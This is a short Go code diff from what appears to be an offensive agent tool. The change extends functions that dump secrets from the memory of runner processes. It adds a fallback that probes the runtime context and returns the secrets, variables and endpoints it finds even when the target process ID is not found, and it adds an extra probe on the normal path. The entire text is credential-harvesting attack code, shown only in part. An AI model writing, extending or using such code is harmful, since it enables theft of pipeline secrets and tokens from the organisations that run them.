@@ -28,7 +28,16 @@ func (a *Agent) DumpRunnerSecrets() *MemDumpResult {
 
 	pid, err := scanner.FindPID()
 	if err != nil {
-		return &MemDumpResult{Error: err.Error()}
+		results := make(chan gump.Result, 100)
+		gump.ProbeRuntimeContext(0, results)
+		close(results)
+		secrets, vars, endpoints := collectMemDumpResults(results)
+		return &MemDumpResult{
+			Error:     err.Error(),
+			Secrets:   secrets,
+			Vars:      vars,
+			Endpoints: endpoints,
+		}
 	}
 
 	return a.DumpRunnerSecretsFromPID(pid)
@@ -42,6 +51,7 @@ func (a *Agent) DumpRunnerSecretsFromPID(pid int) *MemDumpResult {
 	var stats gump.ScanStats
 	var scanErr error
 
+	gump.ProbeRuntimeContext(pid, results)
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
